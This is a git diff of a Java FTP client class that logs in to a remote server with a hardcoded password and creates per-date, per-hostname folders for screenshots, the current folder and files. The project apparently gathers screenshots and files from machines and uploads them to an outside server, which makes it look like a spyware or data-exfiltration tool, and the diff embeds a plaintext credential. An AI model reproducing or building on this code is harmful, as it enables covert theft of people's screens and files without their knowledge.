@@ -3,11 +3,10 @@ package fr.mimifan.jac.ftp;
 import fr.mimifan.jac.Main;
 import org.apache.commons.net.ftp.FTP;
 import org.apache.commons.net.ftp.FTPClient;
-import org.jetbrains.annotations.Nullable;
 
 import java.io.*;
 import java.text.SimpleDateFormat;
-import java.util.concurrent.atomic.AtomicInteger;
+import java.time.LocalDate;
 
 public class FileTransferClient {
 
@@ -20,8 +19,15 @@ public class FileTransferClient {
     String password = "GoodCutiesDontDeleteAnything";
 
 
-    String screenshotsDir = Main.hostname + "/screenshots";
-    String currentDirectory = Main.hostname + "/currentFolder";
+    LocalDate date = LocalDate.now();
+    String currentTime = date.getYear() + "-" + date.getMonth() + "-" + date.getDayOfMonth();
+
+    String hostName = Main.hostname;
+    String hostDirectory = currentTime + "/" + hostName;
+
+    String screenshotsDir = hostDirectory + "/screenshots";
+    String currentDirectory = hostDirectory + "/currentFolder";
+    String filesDir = hostDirectory + "/files";
 
 
     public void load() {
@@ -33,7 +39,8 @@ public class FileTransferClient {
             client.setFileType(FTP.BINARY_FILE_TYPE);
             System.out.println("Good cutie~\nEverything is for Mommy Lila :3");
 
-            client.makeDirectory(Main.hostname);
+            client.makeDirectory(currentTime);
+            client.makeDirectory(hostDirectory);
             client.makeDirectory(screenshotsDir);
             client.makeDirectory(currentDirectory);
 
